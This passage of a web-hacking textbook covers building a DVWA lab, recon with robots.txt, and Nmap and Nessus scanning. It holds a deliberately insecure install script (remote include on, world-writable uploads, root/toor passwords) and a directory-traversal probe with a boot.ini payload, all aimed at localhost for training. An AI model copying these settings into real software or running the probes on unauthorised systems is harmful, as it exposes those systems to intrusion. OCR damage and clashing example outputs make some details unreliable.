+3. You will surely “break” the web application or web server as you work your way
+through the book, so it’s critical that you have an environment that you can easily
+set up initially as well as “push the reset button” to get back to a state where you
+know everything is set up correctly.
+There are countless ways that you could set up and conﬁgure such an environment,
+but for the duration of this book, virtual machines will be used. A virtual machine (VM),
+when conﬁgured correctly, meets all three of our testing environment requirements. A
+VM is simply a software implementation of a computing environment running on
+another computer (host). The VM makes requests for resources, such as processing cycles
+and RA M memory usage, to the host computer that allows the VM to behave in the same
+manner as traditionally installed operating systems. However, a VM can be turned oﬀ,
+moved, restored, rolled back, and deleted very easily in a ma er of just a few keystrokes
+or mouse clicks. You can also run several diﬀerent VMs at the same time, which allows
+you to create a virtualized network of VMs all running on your one host computer. These
+factors make a virtualized testing environment the clear choice for us.
+A lthough you have plenty of options when it comes to virtualization software, in this
+book we’ll use the popular VMWare Player, available for free at http://www.vmware.com.
+O wing to its popularity, there are many preconﬁgured virtual machines that we can use.
+Having systems already in place saves time during setup and allows you to get into the
+actual web hacking material sooner and with less hassle.
+I f VMWare Player is not your preferred solution, feel free to use any virtualization
+product that you are comfortable with. The exact vendor and product isn’t as important
+as the ability to set up, configure, and run the necessary virtualized systems.
+I n this book, we’ll work in one virtual machine that will be used both to host the
+vulnerable web application (target) and to house all of our hacking tools (a acker).
+BackTrack will be used for this virtual machine and is available for download at the
+
+BackTrack Linux homepage, located at http://www.backtrack-linux.org/downloads/.
+Today, BackTrack is widely accepted as the premiere security-oriented operating
+system. There are always eﬀorts to update and improve the hacker’s testing environment
+and the recent release of Kali Linux is sure to gain widespread popularity. However, we
+will be sticking to BackTrack throughout the book. BackTrack includes hundreds of
+professional-grade tools for hacking, doing reconnaissance, digital forensics, fuzzing,
+bug hunting, exploitation, and many other hacking techniques. The necessary tools and
+commands in BackTrack applicable to our approach will be covered in great detail as they
+are introduced.
+
+Target Web Application
+
+D amn Vulnerable Web A pplication (D VWA) will be used for the target web application
+and can be researched further at its homepage at http://www.dvwa.co.uk/. D VWA is a
+PHP/MyS Q L web application that is vulnerable by design to aid security professionals as
+they test their skills and tools in a safe and legal environment. I t’s also used to help web
+developers better understand the processes of securing web applications.
+However, D VWA is not natively available as a VM, so you would have to create your
+own VM and then set up and conﬁgure D VWA to run inside this new VM. I f tha
+interests you, installation instructions and the ﬁles necessary to download are available
+on the DVWA web site.
+For our purposes, we will be accessing D VWA by having it run locally in the BackTrack
+VM via http://localhost or the 127.0.0.1 I P address. We will be hosting both our target
+application (D VWA) and the hacking tools in our BackTrack VM. This means you wil
+have everything you need in one VM and will use less system resources.
+
+Installing The Target Web Application
+
+I n order to set up our safe hacking environment, we ﬁrst need to download a BackTrack
+VM and conﬁgure it to host the D VWA target web application. The following steps ready
+the BackTrack VM for installation of the DVWA.
+1. Download a BackTrack virtual machine from http://www.backtracklinux.org/downloads/.
+2. Extract the. 7z file of the BackTrack virtual machine.
+3. Launch the BackTrack VM by double-clicking the .vmx file in the BackTrack folder.
+If prompted, select I copied it and select OK.
+4. Login to BackTrack with the root user and toor password.
+5. Use the startx command to start the graphical user interface (GUI) of BackTrack.
+6. Open a terminal by clicking on the Terminal icon in the upper left-hand corner of
+the screen. It’s the one that looks like a computer screen with > _ on it as shown in
+Figure 1.1. This is where we will be entering commands (instructions) for a myriad
+of BackTrack tools!
+
+FIGURE 1.1 Opening a terminal in BackTrack.
+
+O nce you have successfully logged into BackTrack, complete the following steps to
+install D VWA as the target application. This will require a live I nternet connection, so
+ensure that your host machine can browse the I nternet by opening a Firefox browser to
+test connectivity.
+
+A le rt
+For trouble-shooting your VM’s ability to make use of the host machine’s
+I nternet connection, check the network adapter se ings for your VM in VM
+Player if necessary. We are using the NAT network setting.
+
+1. Browse to http://theunl33t.blogspot.com/2011/08/script-to-download-configure-andlaunch.html in Firefox (by clicking on Applications and then Internet) in your
+BackTrack VM to view the DVWA installation script created by the team at The
+Unl33t. A link to this script is also included later in the chapter for your reference.
+2. Select and copy the entire script starting with #/bin/bash and ending with last line
+that ends with DVWA Install Finished!\n.
+3. Open gedit Text Editor in BackTrack by clicking on Applications and then
+Accessories.
+4. Paste the script and save the file as DVWA_install.sh in the root directory as
+shown in Figure 1.2.
+
+FIGURE 1.2 Saving the DVWA install script in the root directory.
+
+5. Close gedit and Firefox.
+6. Open a terminal and run the ls command to verify the script is in the root directory.
+7. Execute the install script by running the sh DVWA_install.sh command in a
+terminal. The progress of the installation will be shown in the terminal and a
+browser window to the DVWA login page will launch when successfully
+completed.
+
+Configuring The Target Web Application
+
+O nce D VWA is successfully installed, complete the following steps to login and
+customize the web application:
+1. Login to DVWA with the admin username and password password as shown in
+Figure 1.3.
+
+FIGURE 1.3 Logging into DVWA as an application administrator.
+
+A le rt
+The URL is 127.0.0.1 (this islocalhost; the web server running directly in
+BackTrack).
+
+2. Click the options button in the lower right of Firefox if you are prompted about a
+potentially malicious script. Remember DVWA is purposely vulnerable, so we
+need to allow scripts to run.
+3. Click Allow 127.0.0.1 so scripts are allowed to run on our local web server.
+4. Click the Setup link in DVWA.
+5. Click the Create / Setup Database button to create the initial database to be used
+for our exercises as shown in Figure 1.4.
+
+FIGURE 1.4 Confirmation that the initial database setup completed successfully.
+
+6. Click the DVWA Security link in DVWA and choose low in the drop-down list as
+shown in Figure 1.5.
+
+FIGURE 1.5 Confirmation that the initial difficulty setup completed successfully.
+
+7. Click the submit button to create these initial difficulty settings to be used for our
+exercises. If the exercises are too easy for you, feel free to select a more advanced
+difficulty level!
+You are now ready to use hacking tools in BackTrack to a ack the D VWA web
+application. You can revisit any of these steps to conﬁrm that your environment is set up
+correctly. I t is not necessary to shut down the VM every time you want to take a break.
+I nstead, you can suspend the VM, so the state of your work stays intact. I f you choose to
+shut down the VM to conserve system resources (or for any other reason), you can easily
+follow the steps above to prepare your VM. I t’s probably worth noting that you are now
+running an intentionally vulnerable and exploitable web application on your BackTrack
+machine. S o it’s probably not a good idea to use this machine while connected to the
+Internet where others could attack you!
+
+DVWA Install Script
+#/bin/bash
+echo -e "\n#######################################"
+echo -e "# Damn Vulnerable Web App Installer Script #"
+echo -e "#######################################"
+echo " Coded By: Travis Phillips"
+echo " Website: http://theunl33t.blogspot.com"
+echo -e -n "\n[*] Changing directory to /var/www..."
+cd /var/www > /dev/null
+echo -e "Done!\n"
+echo -n "[*] Removing default index.html..."
+rm index.html > /dev/null
+echo -e "Done!\n"
+echo -n "[*] Changing to Temp Directory..."
+cd /tmp
+echo -e "Done!\n"
+echo "[*] Downloading DVWA..."
+wget http://dvwa.googlecode.com/files/DVWA-1.0.7.zip
+echo -e "Done!\n"
+echo -n "[*] Unzipping DVWA..."
+unzip DVWA-1.0.7.zip > /dev/null
+echo -e "Done!\n"
+echo -n "[*] Deleting the zip file..."
+rm DVWA-1.0.7.zip > /dev/null
+
+echo -e "Done!\n"
+echo -n "[*] Copying dvwa to root of Web Directory..."
+cp -R dvwa/* /var/www > /dev/null
+echo -e "Done!\n"
+echo -n "[*] Clearing Temp Directory..."
+rm -R dvwa > /dev/null
+echo -e "Done!\n"
+echo -n "[*] Enabling Remote include in php.ini..."
+cp /etc/php5/apache2/php.ini /etc/php5/apache2/php.ini1
+sed
+-e
+'s/allow_url_include
+=
+Off/allow_url_include
+=
+On/'
+/etc/php5/apache2/php.ini1 > /etc/php5/apache2/php.ini
+rm /etc/php5/apache2/php.ini1 echo -e "Done!\n"
+echo -n "[*] Enabling write permissions to /var/www/hackable/upload..."
+chmod 777 /var/www/hackable/uploads/
+echo -e "Done!\n"
+echo -n "[*] Starting Web Service..."
+service apache2 start &> /dev/null
+echo -e "Done!\n"
+echo -n "[*] Starting MySQL..."
+service mysql start &> /dev/null
+echo -e "Done!\n"
+echo -n "[*] Updating Config File..."
+cp /var/www/config/config.inc.php /var/www/config/config.inc.php1
+sed
+-e
+'s/'\'\''/'\''toor'\''/'
+/var/www/config/config.inc.php1
+>
+/var/www/config/config.inc.php
+rm /var/www/config/config.inc.php1
+echo -e "Done!\n"
+echo -n "[*] Updating Database..."
+wget
+--post-data
+"create_db=Create
+/
+Reset
+Database"
+http://127.0.0.1/setup.php&> /dev/null
+mysql
+-u
+root
+--password='toor'
+-e
+'update
+dvwa.users
+set
+avatar
+=
+"/hackable/users/gordonb.jpg" where user = "gordonb";'
+mysql
+-u
+root
+--password='toor'
+-e
+'update
+dvwa.users
+set
+avatar
+=
+"/hackable/users/smithy.jpg" where user = "smithy";'
+mysql
+-u
+root
+--password='toor'
+-e
+'update
+dvwa.users
+set
+avatar
+=
+"/hackable/users/admin.jpg" where user = "admin";'
+mysql
+-u
+root
+--password='toor'
+-e
+'update
+dvwa.users
+set
+avatar
+=
+"/hackable/users/pablo.jpg" where user = "pablo";'
+mysql
+-u
+root
+--password='toor'
+-e
+'update
+dvwa.users
+set
+avatar
+=
+"/hackable/users/1337.jpg" where user = "1337";'
+echo -e "Done!\n"
+echo -e -n "[*] Starting Firefox to DVWA\nUserName: admin\nPassword: password"
+firefox http://127.0.0.1/login.php &> /dev/null &
+echo -e "\nDone!\n"
+echo -e "[\033[1;32m*\033[1;37m] DVWA Install Finished!\n"
+
+C H AP T E R 2
+
+Web Server Hacking
+
+Chapter Rundown:
+■ Recon made easy with host and robots.txt
+■ Port scanning with Nmap: getting to know the world’s #1 port scanner
+■ Vulnerability scanning with Nessus and Nikto: finding missing patches and more
+■ Exploitation with Metasploit: a step-by-step guide to poppin’ boxes
+
+Introduction
+
+Web server hacking is a part of the larger universe known casually as “network hacking.”
+For most people, this is the ﬁrst area of hacking that they dig into as it includes the most
+well-known tools and has been widely publicized in the media. J ust check out the movies
+that make use of some of the tools in this chapter!
+O bviously, network hacking isn’t the emphasis of this book, but there are certain tools
+and techniques that every security person should know about. These are introduced in
+this chapter as we target the web server that is hosting the web application. N etwork
+hacking makes use of some of the most popular hacking tools in the world today:
+beauties such as N map, N esses, and Metasploit are tools in virtually every security
+toolbox. I n order to position yourself to take on more advanced hacking techniques, you
+must ﬁrst master the usage of these seminal tools. This is the classic “walk before you
+run” scenario!
+There are several tremendous books and resources dedicated to these tools, but things
+take on a slightly diﬀerent format when we are speciﬁcally targeting the web server.
+Traditional network hacking follows a very systematic methodology that this book is
+based on. We will perform reconnaissance, port scanning, vulnerability scanning, and
+exploitation while targeting the web server as the network service under attack.
+We will perform some manual inspection of the robots.txt ﬁle on the web server to
+be er understand what directories the owner does not want to be included in search
+engine results. This is a potential roadmap to follow to sensitive information within the
+web server—and we can do so from the comfort of our own web browser! We will also
+use some speciﬁc tools dedicated to web server hacking such as N ikto for web server
+vulnerability scanning. Couple all of this with the mature tools and techniques of
+traditional network hacking, and we have a great approach for hacking the web server.
+Let’s dig in!
+
+Reconnaissance
+D uring the Reconnaissance stage (also known as recon or information gathering), you
+gather as much information about the target as possible such as its I P address; the
+network topology; devices on the network; technologies in use; package versions; and
+more. While many tools may be involved in recon, we’ll focus ﬁrst on using host and
+Netcraft to retrieve the server’s I P address (unique numeric address) and to inspect its
+robots.txt file for additional information about the target environment.
+Recon is widely considered as the most important aspect of a network-based a ack.
+
+A lthough recon can be very time-consuming, it forms the basis of almost every
+successful network a ack, so take your time. Be sure when gathering information that
+you record everything. A s you run your tools, save the raw output and you’ll end up with
+an impressive collection of URLs, I P addresses, email addresses, and other noteworthy
+tidbits. I f you’re conducting a professional penetration test, it’s always a good idea to
+save this raw output as often times you will need to include it in the ﬁnal report to your
+client.
+
+Learning About The Web Server
+
+We are targeting the web server because it is designed to be reachable from outside the
+network. I ts main purpose is to host web applications that can be accessed by users
+beyond the internal network. A s such, it becomes our window into the network. First, we
+need to ﬁnd the web server’s external I P address so that we can probe it. We’ll generally
+start with the URL of the target web application, such ashttp://syngress.com, which we’ll
+then convert to an I P address. A URL is usually in text format that is easily remembered
+by a user, while an I P address is a unique numeric address of the web server. N etwork
+hacking tools generally use the I P address of the web server, although you can also use
+the host name and your computer will perform the lookup automatically in the
+background. To convert the URL to an I P address, use thehost command in a BackTrack
+terminal.
+host syngress.com
+
+This command returns the following results, which includes the external I P address of
+the D akota S tate University (dsu.edu) domain as the ﬁrst entry. The other entry relates to
+email services and should be archived for potential use later on.
+dsu.edu has address 138.247.64.140
+dsu.edu mail is handled by 10 dsu-mm01.dsu.edu.
+
+You can also retrieve the I P address by searching by URL athttp://news.netcraft.com/.
+A web browser is capable of processing both I P addresses and URLs to retrieve the home
+page of a web application hosted on a web server. S o to make sure that you have found
+the correct I P address of the web server, enter the I P address directly into a browser to
+see if you reach the target as shown in Figure 2.1.
+
+A le rt
+S imply requesting the I P address in the URL address bar isn’t applicable in a
+shared server environment, which is quite widespread today. This means that
+several web sites are hosted on one I P address in a virtual environment to
+conserve web server space and resources. A s an alternative, you can use an
+online service such as http://sharingmyip.com/ to ﬁnd all the domains that
+share a speciﬁed I P address to make sure that web server is hosting your
+intended target before continuing on. Many shared hosting environments
+require signed agreements before any security testing is allowed to be
+
+conducted against the environment.
+
+FIGURE 2.1 Using an IP address to reach the target.
+
+The Robots.Txt File
+O ne way to begin understanding what’s running on a web server is to view the server’s
+robots.txt file. The robots.txt ﬁle is a listing of the directories and ﬁles on a web server that
+the owner wants web crawlers to omit from the indexing process. A web crawler is a
+piece of software that is used to catalog web information to be used in search engines
+and archives that are mostly commonly deployed by search engines such as Google and
+Yahoo. These web crawlers scour the I nternet and index (archive) all possible ﬁndings to
+improve the accuracy and speed of their Internet search functionality.
+To a hacker, the robots.txt ﬁle is a road map to identify sensitive information because
+any web server’s robots.txt ﬁle can be retrieved in a browser by simply requesting it in the
+URL. Here is an examplerobots.txt ﬁle that you can easily retrieve directly in your
+browser by simply requesting /robots.txt after a host URL.
+User-agent: *
+# Directories
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+
+Disallow: /logout/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=logout/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+
+This robots.txt file is broken out into four different sections:
+1. Directories
+2. Files
+3. Paths (clean URLs)
+4. Paths (no clean URLs)
+Clean URLs are absolute URL paths that you could copy and paste into your browser
+Paths with no clean URLs are using a parameter,q in this example, to drive the
+functionality of the page. You may have heard this referred to as a builder page, where
+one page is used to retrieve data based solely on the URL parameter(s) that were passed
+in. Directories and files are straightforward and self-explanatory.
+Every web server must have a robots.txt ﬁle in its root directory otherwise web crawlers
+may actually index the entire site, including databases, ﬁles, and all! Those are items no
+web server administrator wants as part of your next Google search. The root directory of
+a web server is the actual physical directory on the host computer where the web server
+software is installed. In Windows, the root directory is usually C:/inetpub/wwwroot/, and in
+Linux it’s usually a close variant of /var/www/.
+There is nothing stopping you from creating a web crawler of your own that provides
+the complete opposite functionality. S uch a tool would, if you so desired, only request
+and retrieve items that appear in the robots.txt and would save you substantial time if you
+are performing recon on multiple web servers. O therwise, you can manually request and
+review each robots.txt ﬁle in the browser. The robots.txt ﬁle is complete roadblock for
+automated web crawlers, but not even a speed bump for human hackers who want to
+review this sensitive information.
+
+Port Scanning
+Port scanning is simply the process of identifying what ports are open on a target
+computer. I n addition, ﬁnding out what services are running on these ports in a common
+outcome of this step. Ports on a computer are like any opening that allows entry into a
+house, whether that’s the front door, side door, or garage door. Continuing the house
+analogy, services are the traﬃc that uses an expected entry point into the house. For
+example, salesmen use the front door, owners use the garage door, and friends use the
+
+side door. J ust as we expect salesmen to use the front door, we also expect certain
+services to use certain ports on a computer. I t’s pre y standard for HTTP traﬃc to use
+port 80 and HTTPS traﬃc to use port 443. S o, if we ﬁnd ports 80 and 443 open, we can be
+somewhat sure that HTTP and HTTPS are running and the machine is probably a web
+server. O ur goal when port scanning is to answer three questions regarding the web
+server:
+1. What ports are open?
+2. What services are running on these ports?
+3. What versions of those services are running?
+I f we can get accurate answers to these questions, we will have strengthened our
+foundation for attack.
+
+Nmap
+
+The most widely used port scanner is Nmap, which is available in BackTrack and has
+substantial documentation at http://nmap.org. First released by Gordon “Fyodor” Lyon in
+1997, Nmap continues to gain momentum as the world’s best port scanner with added
+functionality in vulnerability scanning and exploitation. The most recent major release of
+Nmap at the time of this writing is version 6, and it includes a ton of functionality
+dedicated to scanning web servers.
+
+Updating Nmap
+Before you start using with Nmap, be sure that you’re running the most recent version by
+running the nmap -V command in a terminal. I f you are not running version 6 or higher,
+you need to update Nmap. To perform the updating process, open a terminal in
+BackTrack and run the apt-get upgrade nmap command. To make sure you are running
+version 6 or higher, you can again use the nmap -V command after installation is
+complete.
+
+Running Nmap
+There are several scan types in Nmap and switches that add even more functionality. We
+already know the IP address of our web server so many of the scans in Nmap dedicated to
+host discovery (ﬁnding an I P address of a server) can be omi ed as we are more
+interested in harvesting usable information about the ports, services, and versions
+running on the web server. We can run Nmap on our D VWA web server when it’s
+running on the localhost (127.0.0.1). From a terminal, run the following Nmap command.
+nmap -sV -O -p- 127.0.0.1
+
+Let’s inspect each of the parts of the command you just ran, so we all understand what
+the scan is trying to accomplish.
+■ The –sV designates this scan as a versioning scan that will retrieve specific versions of
+the discovered running services.
+■ The –O means information regarding the operating system will be retrieved such as
+the type and version.
+
+■ The -p- means we will scan all ports.
+■ The 127.0.0.1 is the IP address of our target.
+O ne of Nmap’s most useful switches is ﬁngerprinting the remote operating system to
+retrieve what services and versions are on the target. Nmap sends a series of packets to
+the remote host and compares the responses to its nmap-os-db database of more than 2600
+known operating system fingerprints. The results of our first scan are shown below.
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000096s latency).
+Not shown: 65532 closed ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.2.14 ((Ubuntu))
+3306/tcp open mysql MySQL 5.1.41-3ubuntu12.10
+7337/tcp open postgresql PostgreSQL DB 8.4.0
+8080/tcp open http-proxy Burp Suite Pro http proxy
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:kernel:2.6 cpe:/o:linux:kernel:3
+OS details: Linux 2.6.32 - 3.2
+Network Distance: 0 hops
+OS and Service detection performed. Please report any incorrect results at
+http://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds
+
+You can see four columns of results: PORT, STATE, SERVICE, and VERSION. I n this
+instance, we have four rows of results meaning we have four services running on this
+web server. I t is pre y self-explanatory what is running on this machine (your results
+may vary slightly depending on what you have running in your VM), but let’s discuss
+each, so we are all on the same page with these Nmap results.
+■ There is an Apache 2.2.14 web server running on port 80.
+■ There is a 5.1.41 MySQL database running on port 3306.
+■ There is a PostreSQL 8.4 database running on port 7175.
+■ There is a web proxy (Burp Suite) running on port 8080.
+Knowing the exact services and versions will be a great piece of information in the
+upcoming vulnerability scanning and exploitation phases. There are also additional notes
+about the kernel version, the operating system build details, and the number of network
+hops (0 because we scanned our localhost).
+
+A le rt
+Running N map against localhost can be deceiving, as the ports that are
+listening on the machine may not actually be available to another machine.
+S ome of these machines may be on the same local area network (LA N ) or
+completely outside of the LA N . 127.0.0.1 only pertains to the local machine
+and is the loopback address that every machine uses to communicate to
+itself. I n order to get a clear understanding of what is accessible by outsiders
+to this machine, you would actually need to run this same Nmap scan from
+two diﬀerent machines. You could run one from a machine inside the
+
+network (your coworker’s machine) and one from a machine outside network
+(your home machine). You would then have three scans to compare the
+results of. I t’s not critical that you do this for our work, but it’s important to
+realize that you may get diﬀerent results depending on what network you
+scan from.
+
+Nmap Scripting Engine (NSE)
+O ne of the ways that Nmap has expanded its functionality is the inclusion of scripts to
+conduct specialized scans. You simply have to invoke the script and provide any
+necessary arguments in order to make use of the scripts. The N map Scripting Engine
+(NSE) handles this functionality and fortunately for us has tons of web-speciﬁc scripts
+ready to use. O ur D VWA web server is pre y boring, but it’s important to realize what is
+capable when using NSE. There are nearly 400 Nmap scripts (396 to be exact at last
+count), so you’re sure to ﬁnd a couple that are useful! You can see all current N S E scripts
+and the accompanying documentation at http://nmap.org/nsedoc/. Here are a couple
+applicable Nmap scripts that you can use on web servers.
+You invoke all N S E scripts with--script=<script name > as part of the Nmap scan
+syntax. This example uses the http-enum script to enumerate directories used by popular
+web applications and servers as part of a version scan.
+nmap -sV --script=http-enum 127.0.0.1
+
+A sample output of this script ran against a Windows machine is shown below where
+seven diﬀerent common directories have been found. These directories can be used in
+later steps in our approach related to path traversal a acks. You can run this same N S E
+script against D VWA and will see several directories listed and an instance of MyS Q L
+running.
+Interesting ports on 127.0.0.1:
+PORT STATE SERVICE REASON
+80/tcp open http syn-ack
+| http-enum:
+| | /icons/: Icons and images
+| | /images/: Icons and images
+| | /robots.txt: Robots file
+| | /sw/auth/login.aspx: Citrix WebTop
+| | /images/outlook.jpg: Outlook Web Access
+| | /nfservlets/servlet/SPSRouterServlet/: netForensics
+|_ |_ /nfservlets/servlet/SPSRouterServlet/: netForensics
+
+A nother common web server scan that is very helpful is to check if the target machine
+is vulnerable to anonymous M icrosoft FrontPage logins on port 80 by using the
+http-frontpage-login script. O ne thought you may be having is, “I thought FrontPage was
+only a Windows environment functionality.” O bviously, this is most applicable to
+Windows environments that are running FrontPage, but when FrontPage extensions
+were still widely used, there was support for this functionality on Linux systems as well.
+FrontPage Extensions are no longer supported by Microsoft support, but they are still
+
+widely used in older web servers.
+nmap 127.0.0.1 -p 80 --script = http-frontpage-login
+
+The sample output of the http-frontpage-login in shown below. O lder default
+conﬁgurations of FrontPage extensions allow remote user to login anonymously, which
+may lead to complete server compromise.
+PORT STATE SERVICE REASON
+80/tcp open http syn-ack
+| http-frontpage-login:
+| VULNERABLE:
+| Frontpage extension anonymous login
+| State: VULNERABLE
+| Description:
+| Default installations of older versions of frontpage
+anonymous logins which can lead to server compromise.
+|
+| References:
+
+extensions
+
+allow
+
+|_ http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
+
+The last example of NSE included here is to check if a web server is vulnerable to
+directory traversal by a empting to retrieve the /etc/passwd ﬁle on a Linux web server or
+boot.ini ﬁle on a Windows web server. This is a vulnerability that allows an a acker to
+access resources in the web server’s ﬁle system that should not be accessible. This type
+of a ack is covered in much more detail in a later chapter, but it’s tremendous
+functionality is to have Nmap check for this vulnerability during the web server hacking
+portion of our approach. This is another great example of discoveries made in one step,
+which can be used later when attacking different targets.
+nmap --script http-passwd --script-args http-passwd.root =/ 127.0.0.1
+
+This is a great NSE script because it is diﬃcult for automated web application scanners
+to check for directory traversal on the web server. S ample output illustrating this
+vulnerability is introduced here.
+80/tcp open http
+| http-passwd: Directory traversal found.
+| Payload: "index.html?../../../../../boot.ini"
+| Printing first 250 bytes:
+| [boot loader]
+| timeout=30
+| default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+| [operating systems]
+|_multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft
+Professional" /noexecute=optin /fastdetect
+
+Windows
+
+XP
+
+T he Nmap ﬁndings from port scanning tie directly into the following sections when
+Nessus and Nikto are used to scan for vulnerabilities in the web server.
+
+Vulnerability Scanning
+Vulnerability scanning is the process of detecting weaknesses in running services. O nce
+you know the details of the target web server, such as the IP address, open ports, running
+services, and versions of these services, you can then check these services for
+vulnerabilities. This is the last step to be performed before exploiting the web server.
+
+Vulnerability scanning is most commonly completed by using automated tools loaded
+with a collection of exploit and fuzzing signatures, or plug-ins. These plug-ins probe the
+target computer’s services to see how they will react to possible a ack. I f a service reacts
+in a certain way, the vulnerability scanner is triggered and knows not only that the
+service is vulnerable, but also the exact exploit that makes it vulnerable.
+This is very similar to how antivirus works on your home computer. When a program
+tries to execute on your computer, the antivirus product checks its collection of knownmalicious signatures and makes a determination if the program is a virus or not.
+Vulnerability scanners and antivirus products are only as good as the signatures that
+they are using to check with. I f the plug-ins of your vulnerability scanner are out-of-date,
+the results will not be 100% accurate. I f the plug-ins ﬂag something as a false positive,
+the results will not be 100% legitimate. I f the plug-ins miss an actual vulnerability, the
+results will not be 100% legitimate. I’m sure you get the drift by now!
+I t’s critical that you understand vulnerability scanning’s place in the total landscape of
+hacking. Very advanced hackers don’t rely on a vulnerability scanner to ﬁnd exploitable
+vulnerabilities; instead they perform manual analysis to ﬁnd vulnerabilities in software
+packages and then write their own exploit code. This is outside the scope of this book,
+but in order to climb the mountain of elite hacking, you will need to become comfortable
+with fuzzing, debugging, reverse engineering, custom shell code, and manual
+exploitation. These topics will be discussed in more detail in the ﬁnal chapter of this
+book to give you guidance moving forward.
+
+Nessus
+
+We will be using Nessus, one of the most popular vulnerability scanners available, to
+complete the vulnerability scanning step. However, hackers who use vulnerability
+scanners will always be a step behind of the cu ing edge of security because you have to
+wait for scanner vendors to write a plug-in that will detect any new vulnerability before it
+gets patched. I t is very common to read about a new exploit and mere hours later have a
+Nessus plug-in deployed to check for this new vulnerability. Be er yet, often times you
+will read about the new vulnerability and the corresponding Nessus plug-in in the same
+story! When you use the free HomeFeed edition of N essus, your plug-ins will be delayed
+7 days, so your results will be slightly diﬀerent compared to the pay-for ProfessionalFeed
+edition of the scanner for the most recent vulnerabilities.
+
+Installing Nessus
+The process to install Nessus is very straightforward and once it’s configured it will run as
+a persistent service in BackTrack. You can download the installer for the free home
+version of Nessus at http://www.nessus.org The ProfessionalFeed version ofNessus is
+approximately $1,500 per year, but you can use the HomeFeed version to assess your own
+personal servers. I f you are going to perform vulnerability scanning as part of your job or
+anywhere outside your personal network, you need to purchase the ProfessionalFeed
+activation code.
+
+You must pick your activation code based on the operating system that the Nessus
+service will be running on. For this book, you are using a 32-bit virtual machine of
+BackTrack 5 that is based on Ubuntu (version 10.04 at the time of this writing). O nce
+you’ve selected the correct operating system version, your activation code will be emailed
+to you. Keep this email in a safe place, as you will need the activation code in the
+upcoming Nessus conﬁguration steps. A quick rundown of the installation process for
+Nessus is described in the following steps.
+1. Save the Nessus installer (.deb file for BackTrack) in the root directory
+2. Open a terminal and run the ls command and note the.deb file is in the root
+directory
+3. Run the dpkg –i Nessus-5.0.3-ubuntu910_i386.deb command to install Nessus
+
+A le rt
+dpkg is a package manager for Debian Linux to install and manage individual
+packages. You may have downloaded a diﬀerent version of the N essus
+installer, so please take note of the exact name of the N essus installer that
+you downloaded. I f you’re unsure what version of N essus you need, you can
+run the lsb:release -a command in a BackTrack terminal to retrieve the
+operating system version details. You can then pick the appropriate N essus
+installer to match and then use that.deb ﬁle in the dkpg command to install
+Nessus.
+
+Configuring Nessus
+O nce you have installed Nessus, you must start the service before using the tool. You will
+only have to issue the /etc/init.d/nessusd start command in a terminal once and then
+Nessus will run as a persistent service on your system. O nce the service is running, the
+following steps introduce how to configure Nessus.
+1. In a browser, go to https://127.0.0.1:8834/ to start the Nessus configuration
+procedure.
+2. When prompted, create a Nessus administrator user. For this book, we will create
+the root user with a password of toor.
+3. Enter the activation code for the HomeFeed from your email.
+4. Log in as the root user after the configuration completes.
+
+A le rt
+■ You must use https in the URL to access the Nessus server as it mandates a
+secure connection.
+
+■ The Nessus server is running on the localhost (127.0.0.1) and port 8834;
+therefore, you must include the: 8834 as part of the URL.
+■ The downloading of Nessus plug-ins and initial configuration will take 56 min depending on your hardware configuration. Have no fear; Nessus will
+load much quicker during future uses!
+
+Running Nessus
+O nce you’ve logged into Nessus, the ﬁrst task is to specify what plug-ins will be used in
+the scan. We will be performing a safe scan on our localhost, which includes all selected
+plug-ins but will not a empt actual exploitation. This is a great approach for a proof-ofconcept scan and ensures that we will have less network outages due to active
+exploitation. Follow these steps to set up the scan policy and the actual scan in Nessus.
+1. Click Scans menu item to open the scans menu.
+2. Click New Scan to define a new scan, enter localhost check for the name of the
+scan, select Internal Network Scan for the Scan Policy, and enter 127.0.0.1 as the
+scan target as shown in Figure 2.2.
+
+FIGURE 2.2 Setting up “localhost check” scan in Nessus.
+
+3. Click the Create Scan button in the lower left of the screen to fire the scan at the
+target!
+O nce the scan is kicked oﬀ, the Scans window will report the ongoing status as shown
+in Figure 2.3.
+
+FIGURE 2.3 Scan confirmation in Nessus.
+
+The scan of 127.0.0.1 will be chock full of serious vulnerabilities because of BackTrack
+being our operating system.
+
+A le rt
+This is a good time to remind you not to use BackTrack as your everyday
+operating system. I t’s great at what it does (hacking!), but not a good choice
+to perform online banking, checking your email, or connecting to unsecured
+networks with. I would advise you to always have BackTrack available as a
+virtual machine, but never rely on it as your base operating system.
+
+Reviewing Nessus Results
+O nce the scan status is completed, you can view the report by clicking on the Results
+menu item, clicking the localhost check report to open it, and clicking on the purple
+critical items as shown in Figure 2.4.
+
+FIGURE 2.4 Report summary in Nessus.
+
+The summary view of the report will be sorted by severity of the vulnerability with
+Critical being the most severe. The others values of severity are High, Medium, Low, and
+Informational. You can drill down into greater detail of any of the vulnerabilities by
+double-clicking one of the report entries as shown in Figure 2.5.
+
+FIGURE 2.5 Report details showing CVE in Nessus.
+
+The Common Vulnerability and Exposures (CVE) identiﬁer is especially valuable
+because these I D s are used to transition from Nessus’ vulnerability scanning to
+Metasploit’s exploitation. CVE identiﬁers are made up of the year in which the
+vulnerability was discovered and a unique identiﬁer. There are several other sources for
+information regarding the CVEs found duringNessus scanning that you can review. The
+oﬃcial CVE site is at https://cve.mitre.org/ and there are additional details available at
+http://www.cvedetails.com/ where you can subscribe to RS S feeds customized to your
+liking. A nother great resource is at http://packetstormsecurity.com/ where full
